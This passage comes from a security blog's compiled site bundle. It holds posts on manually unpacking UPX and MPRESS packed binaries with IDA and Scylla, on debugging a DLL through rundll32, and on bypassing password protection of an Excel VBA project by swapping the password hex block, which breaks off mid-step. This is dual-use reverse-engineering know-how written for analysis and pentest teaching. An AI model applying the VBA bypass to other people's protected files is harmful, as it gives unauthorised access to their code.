https://doi.org/10.1145/3243734.3243771</p>","<p>[53] Kevin A. Roundy, Barton P. Miller, Binary-code obfuscations in prevalent packer tools, ACM Computing Surveys, 11 July 2013, https://doi.org/10.1145/2522968.2522972. </p>","<p>[54] Joan Calvet, Fanny Lalonde Levesque, Erwann Traourouder, Fran\xe7ois Menet, Jos\xe9 M. Fernandez, Jean-Yves Marion, WaveAtlas: Surfing Through the Landscape of Current Malware Packers, Virus Bulletin Conference, 30 Sept 2015.</p>","<p>[55] Dhruwajita Devi, Sukumar Nandi, Detection of packed malware, SecurIT \'12: Proceedings of the First International Conference on Security of Internet of Things, August 2012, https://doi.org/10.1145/2490428.2490431.</p>","<p>[56] Min-Jae Kim, Jin-Young Lee, Hye-Young Chang, SeongJe Cho, Yongsu Park, Minkyu Park, Philip A. Wilsey, Design and Performance Evaluation of Binary Code Packing for Protecting Embedded Software against Reverse Engineering, IEEE International Symposium on Object/Component/Service-Oriented Real-Time Distributed Computing, 07 June 2010, DOI: 10.1109/ISORC.2010.23.</p>","<p>[57] IoT Embedded System, https://emteria.com/blog/iot-embedded-system#:~:text=The%20difference%20between%20an%20embedded,of%20devices%20and%20use%20cases, Emetria, 5 Jul 2022."]}]}]}')},9671:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Manual Unpacking of UPX and MPRESS","tags":["security","reverse engineering","malware"],"date":"FEB 2018","path":"manual-unpacking-upx-and-mpress","banner":"blog/upxmpress/banner.webp","location":"./blog/","type":"blog","search":[{"section":"Packing Indicators","description":"Extracting packing indicators to confirm the presence of packing whether UPX or MPRESS. Using tools like DIE - Detect it Easy and PEStudio"},{"section":"Manual Unpacking of UPX","description":"Manual unpacking of UPX packer. Found the code entry point (a long jump to a different section) with IDA, executed the code up automatically unpack it and extracted the original code with Scylla"},{"section":"Manual Unpacking of MPRESS","description":"Manual unpacking of MPRESS packer. Executed the code with the use of hardware breakpoint to decrypt the code automatically. Used Scylla to extract the original code"}],"body":[{"id":"Manual Unpacking of UPX and MPRESS","title":"<h1> <span style=\\"color:#da1953\\">Man</span>ual Unpacking UPX and MPRESS </h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/upxmpress/banner.webp\\" alt=\\"\\">"]},{"id":"Introduction","title":"<hr><h2><span style=\\"color:#da1953\\">Int</span>roduction</h2>","body":["<blockquote><p><em>“Packing is a technique to hide the original code of a program through one or more layers of compression and/or encryption. Used by malware writers to make static analysis harde, to hide from certain antivirus products via polymorphism (diversity), as packers are used to shrink benevolent programs, they cannot be banned! In-depth analysis of packed malware usually starts in a debugger: in other words, we must unpack the sample…\\"</em></p></blockquote>","<p>The tools I am going to use are:</p>","<ul><li>PEStudio</li><li>Detect It Easy</li><li>IDA (Free)</li><li>Scylla</li></ul><br>"]},{"id":"Packing Indicators","title":"<h2> <span style=\\"color:#da1953\\">Pac</span>king Indicators </h2>","body":["<p>Before doing the unpacking I have to understand if the binary is packed or not and to do this I will use two tools in particular, <strong>Detect It Easy</strong> and <strong>PEStudio</strong>.</p>","<p>I load the binary with <strong>Detect It Easy</strong> to see what information it gives to me.</p>","<p><img src=\\"/cyber/blog/upxmpress/image15.png\\" alt=\\"\\"></p>","<p><strong>Detect It Easy</strong> tells me that it is packed with <strong>UPX</strong> and it also tell the version (3.93), another useful information is the number of sections, to check it is accuracy I also check entropy.</p>","<p><img src=\\"/cyber/blog/upxmpress/image17.png\\" alt=\\"\\"></p>","<p>I check it to be sure that it’s packed, sometimes it could show that the binary is not packed but it has a high level of entropy which is a good indication of packing.</p>","<p>I also need to check the type of the binary (<strong>H</strong>-hexadecimal key in the main window of <strong>Detect It Easy</strong>), even if I know it, I have to be sure.</p>","<p>(<strong>MZ</strong>) These two characters indicate that the binary is a <strong>PE</strong> (Portable Executable) but they might get changed by the attacker, in this case by viewing the number of next bytes I can detect if it’s really a <strong>PE</strong> or not.</p>","<p><img src=\\"/cyber/blog/upxmpress/image32.png\\" alt=\\"\\"></p>","<p>Now I go to <strong>PEStudio</strong> to see what information I can collect and if it also confirms that it is packed.</p>","<p>The first thing I am going to check is the size of the binary to get an idea of ​​who am I dealing with.</p>","<p>If the file is very large it cannot have few imports while for a small file it is plausible but it is not said therefore not to trust is better.</p>","<p><img src=\\"/cyber/blog/upxmpress/image14.png\\" alt=\\"\\"></p>","<p>Here, in addition to the file size, I also see the entropy (7,114) which is very high equal to <strong>Detect It Easy</strong> and therefore it seems that it is packed. I also have the signature confirming that it is packed with UPX.</p>","<p>Now I check the sections, in particular <em>&ldquo;Virtual-Size&rdquo;</em> and <em>&ldquo;Raw-Size&rdquo;</em> of the sections. if at last in one of them the difference is so high it’s a good indicator of packing.</p>","<p>If at least one section has a very high entropy then it is another good indicator of packing (MAX-Entropy: 8), also if at least one section has <strong>WX</strong> (Writable and Executable) permission is also an indicator of packing.</p>","<p><img src=\\"/cyber/blog/upxmpress/image4.png\\" alt=\\"\\"></p>","<p>Now I check the imports, if the imports are so few it’s a good indicator of packing, if <em>“GetProcess”</em> and <em>“LoadLibraryA”</em> are the only imports shown in the PEStudio then it is sure that the binary is packed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image31.png\\" alt=\\"\\"></p>","<p>In this case I have too few imports, there are cases where only the two imports mentioned above are shown.</p>","<p>At last I search the strings in search of the packer’s name, to make the search easier I ordered the strings in descending order.</p>","<p><img src=\\"/cyber/blog/upxmpress/image18.png\\" alt=\\"\\"></p>","<p>Now that I am sure that the binary is packed I will show how to unpack in the two cases where it is packed with MPRESS and the case where it is packed with UPX.</p>","<p>For the first part I used a packed binary with UPX but the results of <strong>PEStudio</strong> and <strong>Detect It Easy</strong> would be almost identical if the file had been packed with MPRESS.</p>",""]},{"id":"Manual Unpacking of UPX","title":"<h2> <span style=\\"color:#da1953\\">Man</span>ual Unpacking of UPX </h2>","body":["<p>To do the unpacking I use <strong>IDA</strong>, any version is fine in my case it is <strong>IDA Free</strong> and I load the binary as <strong>PE</strong>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image25.png\\" alt=\\"\\"></p>","<p>Once the binary is loaded, <strong>IDA</strong> warns me that some imports are not visible and that <strong>IAT</strong> (Import Address Table) is located outside the memory range and this further confirms that the binary is packed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image20.png\\" alt=\\"\\"></p>","<p>To unpack <strong>UPX</strong> I have to look for a <em>&ldquo;tail jump&rdquo;</em>, it is called <em>&ldquo;tail jump&rdquo;</em> because it is usually at the end of the program. This jump has a peculiarity therefore jump from one section to another and therefore it is a very long jump.</p>","<p><img src=\\"/cyber/blog/upxmpress/image13.png\\" alt=\\"\\"></p>","<p>Here I have a jump in the <strong>UPX1</strong> section which goes to another section and jumps to address <strong>402284</strong>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image22.png\\" alt=\\"\\"></p>","<p>In fact I see that the address <strong>402284</strong> is in the <strong>UPX0</strong> section and there are no other jumps of this type so I can conclude that I have found the tail jump.</p>","<p>At this point I put a breakpoint at address <strong>402284</strong> and run the binary and this message confirms once again that the binary is packed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image26.png\\" alt=\\"\\"></p>","<p>Select <em>“yes”</em>.</p>","<p>After the execution the code has changed, now I can see the code that was hidden / compressed inside it.</p>","<p><img src=\\"/cyber/blog/upxmpress/image11.png\\" alt=\\"\\"></p>","<p>I am on a <em>&ldquo;call&rdquo;</em> statement, where I should really be. At this point I can use both the address of the jump instruction (<strong>402284</strong>) and the address to which it jumps (<strong>402558</strong>) as <strong>OEP</strong> (Original Entry Point) and in both addresses they work fine.</p>","<p>In order to unpack I use <strong>Scylla</strong> and in the <strong>OEP</strong> field I write one of the two addresses.</p>","<p><strong><strong>During these operations I must leave IDA running in debug I cannot close it.</strong></strong></p>","<ol><li>I select the process of IDA running the sample.</li><li>I insert in the OEP field the address found on IDA.</li><li>Click “IAT Autosearch”</li></ol>","<p>And it would successfully find the start address and the size. <em><strong>If not it is a good practice to to restart every time Scylla because its buggy</strong></em>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image10.png\\" alt=\\"\\"></p>","<p>At this point I can get the imports simply by clicking <em>&ldquo;Get Imports&rdquo;</em>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image30.png\\" alt=\\"\\"></p>","<p>84 imports were found, since I own the unpacked binary I can double check if the found imports are correct.</p>","<p><img src=\\"/cyber/blog/upxmpress/image19.png\\" alt=\\"\\"></p>","<p>In fact <strong>PEStudio</strong> tells me that the unpacked binary has 84 imports so my process has been successful.</p>","<p>To create the unpacked binary, I click on <em>&ldquo;Dump&rdquo;</em> and save the file.</p>","<p><img src=\\"/cyber/blog/upxmpress/image34.png\\" alt=\\"\\"></p>","<p>Now just I click on <em>&ldquo;Fix Dump&rdquo;</em> and choose the dump created previously to create the unpacked binary.</p>","<p><img src=\\"/cyber/blog/upxmpress/image29.png\\" alt=\\"\\"></p>","<p>To make a further check, I load the new binary with <strong>PEStudio</strong>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image9.png\\" alt=\\"\\"></p>","<p>Here I can see the difference between the original packed binary and the unpacked binary created by me.</p>","<p>The first thing I notice is the size of my file is much larger, which I expected, while the imports of my binary are 0 but this is not a problem because it is a problem during the creation of the new binary with <strong>Scylla</strong> , as long as <strong>Shylla</strong> has found the imports correctly there are no problems even if <strong>PEStudio</strong> does not show them, lastly I see that there are many more strings than before.</p>","<p>And this concludes the manual unpacking of a packed binary with <strong>UPX</strong>.</p>",""]},{"id":"Manual Unpacking of MPRESS","title":"<h2 id=MANUNPACMPRESS> <span style=\\"color:#da1953\\">Man</span>ual Unpacking of MPRESS </h2>","body":["<p>The identification of a packed binary with <strong>MPRESS</strong> is identical to that of <strong>UPX</strong> shown above. Loading the binary with <strong>IDA</strong> tells me directly that maybe it is packed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image2.png\\" alt=\\"\\"></p>","<p>Once the binary is loaded I should be faced with a <em>pusha</em> instruction, if this were not the case, just select the start function and put a breakpoint.</p>","<p><img src=\\"/cyber/blog/upxmpress/image21.png\\" alt=\\"\\"></p>","<p>Now I run the binary paying particular attention to the <em>Stack View</em> window (down right corner window).</p>","<p><img src=\\"/cyber/blog/upxmpress/image5.png\\" alt=\\"\\"></p>","<p>I step over once and notice that the addresses on the stack have changed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image7.png\\" alt=\\"\\"></p>","<p>Now the stack points to start, I step over until I come back again on the start, since the start on the stack appears twice once at <strong>9FF64</strong> and once at <strong>9FF68</strong>.</p>","<p>In my case it was enough for me to do <em>Step Over</em> twice.</p>","<p><img src=\\"/cyber/blog/upxmpress/image1.png\\" alt=\\"\\"></p>","<p>Note that I started from <em>pusha</em> instruction at <strong>4512D7</strong> and now I am at <strong>4512DE</strong>.</p>","<p>Now I right click on the stack address <strong>19FF64</strong> and follow in hex dump.</p>","<p><img src=\\"/cyber/blog/upxmpress/image36.png\\" alt=\\"\\"></p>","<p>The <em>Hex View-1</em> window will change and a byte will be highlighted.</p>","<p><img src=\\"/cyber/blog/upxmpress/image16.png\\" alt=\\"\\"></p>","<p>Now I select the four bytes (DWORD) starting from <strong>D7</strong> and put a breakpoint on it which will be a hardware breakpoint with read and write permission (WR), the permissions <strong>WR</strong> will be set automatically but it is possible to view the breakpoint and modify it but in this case is not needed.</p>","<p><img src=\\"/cyber/blog/upxmpress/image3.png\\" alt=\\"\\"></p>","<p>Now I run the binary with the <em>Play</em> button and I will hit the hardware breakpoint.</p>","<p><img src=\\"/cyber/blog/upxmpress/image28.png\\" alt=\\"\\"></p>","<p>and <strong>IDA</strong> will detect that <strong>RIP</strong> point is not in a defined address same as for <strong>UPX</strong>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image8.png\\" alt=\\"\\"></p>","<p>Upon pressing <em>Yes</em> the code will change and I’m suddenly in a <em>call</em> instruction and I step into, <strong>IDA</strong> will tell me again the same message about <strong>RIP</strong> pointing in an undefined address.</p>","<p>I can’t use the address of <em>call</em> instruction (402BA6) as I did for <strong>UPX</strong> but I have to use the address pointed by the <em>call</em> instruction (401B54).</p>","<p><img src=\\"/cyber/blog/upxmpress/image24.png\\" alt=\\"\\"></p>","<p>And the address <strong>401B54</strong> is my <strong>OEP</strong> which I will use in <strong>Scylla</strong> to unpack it.</p>","<p>Once found the <strong>OEP</strong> the unpacking process will be identical to <strong>UPX</strong> but for completeness I rewrite it anyway.</p>","<p>Remember to restart <strong>Scylla</strong> every time because it’s buggy. Also here I can’t close the <strong>IDA</strong> process which is in debugging.</p>","<p>In order to unpack I follow the same steps as for <strong>UPX</strong>.</p>","<ol><li>I select the process of <strong>IDA</strong> running the sample.</li><li>I insert in the <strong>OEP</strong> field the address found on <strong>IDA</strong>.</li><li>Click <em>“IAT Autosearch”</em></li></ol>","<p>And it would successfully find the <em>start</em> address and the size.</p>","<p><img src=\\"/cyber/blog/upxmpress/image23.png\\" alt=\\"\\"></p>","<p>At this point we can get the imports simply by clicking <em>&ldquo;Get Imports&rdquo;</em>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image6.png\\" alt=\\"\\"></p>","<p>68 imports were found, since I own the unpacked binary also for this I can double check if the found imports are correct.</p>","<p><img src=\\"/cyber/blog/upxmpress/image35.png\\" alt=\\"\\"></p>","<p>In fact <strong>PEStudio</strong> tells me that the unpacked binary has 68 imports so my process has been successful.</p>","<p>To create the unpacked binary, click on <em>&ldquo;Dump&rdquo;</em> and save the file.</p>","<p><img src=\\"/cyber/blog/upxmpress/image12.png\\" alt=\\"\\"></p>","<p>Now just click on <em>&ldquo;Fix Dump&rdquo;</em> and choose the dump created previously to create the unpacked binary.</p>","<p><img src=\\"/cyber/blog/upxmpress/image33.png\\" alt=\\"\\"></p>","<p>To make a further check, I load the new binary with <strong>PEStudio</strong>.</p>","<p><img src=\\"/cyber/blog/upxmpress/image27.png\\" alt=\\"\\"></p>","<p>Here I can see the differences between the original packed binary and the unpacked binary created by me.</p>","<p>Much like <strong>UPX</strong>, even here the same values change even if the change is not much.</p>","<p>The unpacked version with <strong>Scylla</strong> has 0 imports, same as the <strong>UPX</strong> it’s not a problem as long as during the process <strong>Scylla</strong> found all the imports.</p>","<p>This conclude the manual unpacking of binaries packed with MPRESS.</p>",""]}]}]}')},7389:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Run and Debug Dll","tags":["security","reverse engineering","windows"],"date":"JAN 2018","path":"run-and-debug-dll","location":"./blog/","banner":"blog/rundebugdll/banner.webp","type":"blog","search":[{"section":"Run DLL","description":"Runnin a DLL with \\"rundll32.exe\\" from the command line"},{"section":"Debug DLL","description":"Debugging the DLL by running it via \\"rundll32.exe\\" from a running IDA to find the DLL entry point (address of the load DLL function) and mapping the base address of a second non-running IDA to match the running IDA to analyze the code"}],"body":[{"id":"Run and Debug DLL","title":"<h1><span style=\\"color:#da1953\\">Run</span> and Debug Dll</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/rundebugdll/banner.webp\\" alt=\\"\\">"]},{"id":"Introduction","title":"<hr><h2><span style=\\"color:#da1953\\">Int</span>roduction </h2>","body":["<p>A DLL is a library that contains functions/code and datato to be used by more than one program at the same time, unlike normal programs it does not contain a <strong>main</strong> function therefore it does not have an entry point for execution.</p>","<p>However, there are various reasons to execute a DLL, for example to solve a CTF, to analyze a DLL dropped by malware or to understand how it works.</p>"]},{"id":"Runand DLL","title":"<h2> <span style=\\"color:#da1953\\">Run</span> DLL </h2>","body":["<p>To run any DLL I have to use <em>rundll</em> program in my case I am using <code>rundll32</code> because the DLL is x86. So in order to run a DLL I have to execute the command <code>rundll32 hellow-world-x86.dll,#2</code> where <strong>#2</strong> is the number of exports.</p>","<p>After the execution, a popup with the message <em>Hello world</em> will appear.</p>","<p><img src=\\"/cyber/blog/rundebugdll/1.jpg\\" alt=\\"\\"></p>"]},{"id":"Debug DLL","title":"<p><h2 id=DBGDLL> <span style=\\"color:#da1953\\">Deb</span>ug DLL </h2></p>","body":["<p>In order to dynamically debug the DLL I am going to use <strong>IDA Free</strong> and as I see trying to run it as usual does not work at all.</p>","<p><img src=\\"/cyber/blog/rundebugdll/3.JPG\\" alt=\\"\\"></p>","<p>Now to run and debug the DLL properly I open two IDA windows, one with the DLL in static analysis and another in dynamic analysis running the DLL via <code>rundll32</code> program in IDA.</p>","<p>Now I open another IDA window and open\xa0rundll32 which is in the path C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe to dynamically analyse my DLL and leave the other IDA window in static analysis in the background (for now).</p>","<p><img src=\\"/cyber/blog/rundebugdll/4.JPG\\" alt=\\"\\"></p>","<p>If this error message appears press <em>&ldquo;Yes&rdquo;</em>, it means I have to choose a different path to save the IDA databases for future analysis and I usually choose my Desktop.</p>","<p><img src=\\"/cyber/blog/rundebugdll/5.JPG\\" alt=\\"\\"></p>","<p>At this point, I have to tell the <code>rundll32</code> loaded in IDA to execute my <code>hello-world-x86.dll</code>.</p>","<p><img src=\\"/cyber/blog/rundebugdll/6.jpg\\" alt=\\"\\"></p>","<p>and a window will pop up where I can insert the parameters that <code>rundll32</code> take which are the name of the DLL to run and its parameters similar to when I executed in the shell, but with the only difference that I have to put the full path of the DLL.</p>","<p><img src=\\"/cyber/blog/rundebugdll/7.jpg\\" alt=\\"\\"></p>","<p>Once set the parameters I have to set the debugger in order to stop at each load and unload of library in this way as soon as my DLL is loaded the process will stop without continuing to go on, at that point I can begin to analyze the DLL\'s code.</p>","<p><img src=\\"/cyber/blog/rundebugdll/8.jpg\\" alt=\\"\\"></p>","<p>At the <em>&ldquo;Debugger setup&rdquo;</em> windows I have to check <em>&ldquo;Suspend on library load/unload&rdquo;</em> in the <em>&ldquo;Event&rdquo;</em> section, and <em>&ldquo;Library load/unload&rdquo;</em> in <em>&ldquo;Logging&rdquo;</em> section.</p>","<p><img src=\\"/cyber/blog/rundebugdll/9.jpg\\" alt=\\"\\"></p>","<p>By enabling logging on load/unload operation I can see what libraries are loading and unloading and when my DLL is being loaded. Now I start debugging by pressing the play button.</p>","<p>I can see the libraries start loading and each time a library is loaded it stops so I have to keep pressing play every time until my library (<code>hello-world-x86.dll</code>) is loaded.</p>","<p><img src=\\"/cyber/blog/rundebugdll/10.JPG\\" alt=\\"\\"></p>","<p>After quite a lot my DLL get loaded.</p>","<p><img src=\\"/cyber/blog/rundebugdll/11.jpg\\" alt=\\"\\"></p>","<p>Now to see at what address the library is loaded I have to look at the <em>&ldquo;Modules List&rdquo;</em> window, if the Windows is not there I can open it.</p>","<p><img src=\\"/cyber/blog/rundebugdll/12.jpg\\" alt=\\"\\"></p>","<p>In my case, the library has been loaded at <strong>73670000</strong>.</p>","<p><img src=\\"/cyber/blog/rundebugdll/13.JPG\\" alt=\\"\\"></p>","<p>If ASLR is on at every run the DLL will be loaded in a different address so in order to match the address from the IDA window of static analysis (which starts at <strong>10001000</strong>) with the dynamic analysis one</p>","<p><img src=\\"/cyber/blog/rundebugdll/14.jpg\\" alt=\\"\\"></p>","<p>I have to rebase the IDA window in static analysis in order to let it start from <strong>73670000</strong> instead of <strong>10001000</strong>.</p>","<p><img src=\\"/cyber/blog/rundebugdll/15.jpg\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/rundebugdll/16.jpg\\" alt=\\"\\"></p>","<p>The rebased program address has now changed.</p>","<p><img src=\\"/cyber/blog/rundebugdll/18.jpg\\" alt=\\"\\"></p>","<p>At this point I am stopped right after the dynamic IDA window loaded my DLL, I select any line of code and press <em>&ldquo;G&rdquo;</em> to jump in a specific address. The address where I wan to to jump is the one I found after rebasing my DLL in the stacic view of IDA which is <strong>73671000</strong> and I will jump in the desired portion of the code I want to debug.</p>","<p><img src=\\"/cyber/blog/rundebugdll/17.JPG\\" alt=\\"\\"></p>","<p>In this way I can find by using the static view any portion of the code of the DLL, put a breakpoint, jump there and debug by executing it step by step.</p>",""]}]}]}')},5391:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"test","tags":["security","reverse engineering","windows"],"date":"11/08/2024","location":"./blog/","banner":"rundebugdll/banner.webp","type":"blog","search":[{"keyword":"KeyWord1","description":"test search keyword1 in a live search react application"},{"keyword":"OnlyWord","description":"test search keyword1 in a live search react application"},{"keyword":"MoreWord1","description":"test search keyword1 in a live search react application"},{"keyword":"IdontKnowwhatword","description":"test search keyword1 in a live search react application"},{"keyword":"Key1","description":"test search keyword1 in a live search react application"},{"keyword":"Only","description":"test search keyword1 in a live search react application"},{"keyword":"Word1","description":"test search keyword1 in a live search react application"},{"keyword":"Idontword","description":"test search keyword1 in a live search react application"}],"body":[{"id":"Testing1","title":"<h1> <span style=\\"color:#da1953\\">Tes</span>ting 1</h1><hr>","body":[{"id":"Testing1.1","title":"<h2>Testing 1.1 depth</h2>","body":[{"id":"Testing1.1.1.1","title":"<h2>Testing 1.1.1 depth</h2>","body":["<p><b>this1</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test.</p>"]}]},{"id":"Testing1.2","title":"<h2>Testing 1.2 depth</h2>","body":["<p><b>this1.2</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test.</p>"]}]},{"id":"Testing2","title":"<h1> <span style=\\"color:#da1953\\">RTes</span>ting 2</h1><hr>","body":["<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>"]},{"id":"Testing3","title":"<h1> <span style=\\"color:#da1953\\">Tes</span>ting 3</h1>","body":["<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 3.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>"]}]}')},5570:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Bypass Visual Basic password protected source code","tags":["security","reverse engineering","windows","visual basic","login panel","bypass","hex","application"],"date":"JUL 2021","path":"vb-password-bypass","location":"./blog/","banner":"blog/vbpasswordbypass/banner.webp","type":"blog","search":[{"section":"Replace password protection","description":"Replacing Visual Basic (VB) password hex code with a known password to bypass the login panel and accssin the source code"}],"body":[{"id":"Run and Debug DLL","title":"<h1><span style=\\"color:#da1953\\">Byp</span>ass Visual Basic password protected source code</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/vbpasswordbypass/banner.webp\\" alt=\\"\\">"]},{"id":"Introduction","title":"<hr><h2><span style=\\"color:#da1953\\">Int</span>roduction</h2>","body":["<p>During one of my penetration tests, I was presented with a Visual Basic application to test. This VB application was part of an Excel sheet. After some basic testing, I dug into it a little bit more and found out that the authentication panel could be bypassed. After some research, I was able to bypass it, access the source code, and modify it. Here I am presenting a demo with a Hello Word project to avoid disclosing client\'s sensitive information.</p>","<p>The objective is to create 2 VB applications. The first one acts as a target to bypass with the password set as \\"test\\" (unknown to us), the second one set with a password known to us \\"jafor\\", then replacing the known password inside the target file to access the source code with the known password (\\"jafor\\")</p>"]},{"id":"Create Hello Word Project","title":"<h2><span style=\\"color:#da1953\\">Cre</span>ate Hello Word Project</h2>","body":[{"id":"Enable Developer Tab in Excel","title":"<h3>Enable Developer Tab in Excel</h3>","body":["<p>In order to create a visual basic project, you must first enable the developer tab to access the editor. To enable the developer tab you need to go to File → Options → Customize ribbons. Once the Excel Options window is open, enable developer mode and click &quot;OK&quot;.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/1b36eb565bf04e759f9399d43dee5d31.png\\"></p>","<p>Now you can access macros and write code in Visual Basic.</p>"]},{"id":"Write source code","title":"<h3>Write source code</h3>","body":["<p>To access the code editor from the Developer tab, click Visual Basic.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/8865d3c2b8a744f6a57ffe435041d632.png\\"></p>","<p>At this point you will find yourself in front of your editor ready to write the code.</p>","<img src=\\"/cyber/blog/vbpasswordbypass/31350674d7ef40e693fae6fb97f708e3.png\\"></p>","<p>The code with which I tested the project is the following:</p>","<p><pre class=\\"code-vb\\"><span class=\\"keyword\\">Sub</span> TestProtection()<br><span class=\\"function\\">Range</span>(<span class=\\"string\\">\\"A1\\"</span>).<span class=\\"function\\">Value</span> = <span class=\\"string\\">\\"Hello World\\"</span><br><span class=\\"function\\">Range</span>(<span class=\\"string\\">\\"B1\\"</span>).<span class=\\"function\\">Value</span> = <span class=\\"function\\">Int</span>((10 * <span class=\\"function\\">Rnd</span>) + 1)<br><span class=\\"keyword\\">End</span> <span class=\\"keyword\\">Sub</span><br></pre></p>"]},{"id":"Set Password Protection","title":"<h3>Set Password Protection</h3>","body":["<p>To set the password go to Tools → VBAProject Properties → Protection Tab Set the password as you like and remember to enable &quot;Lock project for viewing&quot;. This option prevents the code from being displayed.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/9d625bae970940b48d5298e6c4e2221a.png\\"></p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/64aa7bd0a02343ceb079f66d6fc9cae5.png\\"></p>","<p>In this file, the password set is &quot;test&quot;.</p>"]},{"id":"Save file","title":"<h3>Save file</h3>","body":["<p>To save the project click on &quot;Save&quot; and choose &quot;No&quot;.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/a43a6fa18bc248e2a21bc64a785f86aa.png\\"></p>","<p>In the new window that will be presented, change the format of the file to be saved to &quot;Excel Macro-Enabled Workbook&quot; and save it.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/6a20d818fca248beac72abe99e9c7b60.png\\"></p>","<p>It will generate a new file containing the source code.</p>"]},{"id":"Test Password Protection","title":"<h3>Test Password Protection</h3>","body":["<p>To test the password protection open the new file and access the source code, the shorcut is alt+F11 but for some reason is not working for me. Another way to access is navigating to Developer tab and access VisualBasic.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/efa4d62102ca42959f3b55845fb5b77d.png\\"></p>","<p>Trying to access the project containing the source code, you will be asked to enter the previously set password.</p>","<img src=\\"/cyber/blog/vbpasswordbypass/d2b595d50c3a49d98d25b5d4f3710e06.png\\"></p>"]}]},{"id":"Replace password protection","title":"<h2><span style=\\"color:#da1953\\">Rep</span>lace password protection</h2>","body":[{"id":"Create a dummy project","title":"<h3>Create a dummy project</h3>","body":["<p>In order to access the password-protected source code, we need to create a dummy project with our password and replace the binary dedicated to checking the password on the target file with our own. In words, it might seem difficult but with the example, I am about to show it will be very simple.  Now let\'s recreate the second file in the same way as seen above but with a different password, let\'s say that this time the password will be &quot;jafor&quot;. So we have 2 files one with a password set to &quot;test&quot; which is the target file in which we have to bypass the password and the second is our file with a password set to &quot;jafor&quot;. The goal is to replace the password &quot;test&quot; of the first file with the password &quot;jafor&quot;.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/11b19e8cf2624d2f8c16b9134396e097.png\\"></p>"]},{"id":"Exctrat jafor\'s authentication hex code","title":"<h3>Exctrat jafor\'s authentication hex code</h3>","body":["<p>To extract the code you need to change the file format from <em>.xlsm</em> to <em>.zip</em>.<p>","<img src=\\"/cyber/blog/vbpasswordbypass/fa3bb4f12a974f5a8a80b4992948b541.png\\"></p>","<p>When opening the zip file you will find a folder structure like the following:</p>","<img src=\\"/cyber/blog/vbpasswordbypass/cd3dc0fb138e4ccda1c12cef78d7ca41.png\\"></p>","<p>Navigate into the <strong>xl</strong> directory and open <strong>vbaProject.bin</strong> with a hex editor.</p>","<img src=\\"/cyber/blog/vbpasswordbypass/735041c734354f049bbf9fc0c079d365.png\\"></p>","<p>The hex-editor used is <a data-from-md title=\'https://mh-nexus.de/en/hxd/\' href=\'https://mh-nexus.de/en/hxd/\'>xhd</a>. Once opened the <em>filevbaProject .bin</em> with the hex-editor, search for the text <em>CMG</em> as seen in the image below.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/c7981a94ce9e4d49bfca963c1c740516.png\\"></p>","<p>Now copy the portion as shown below.</p>","<img 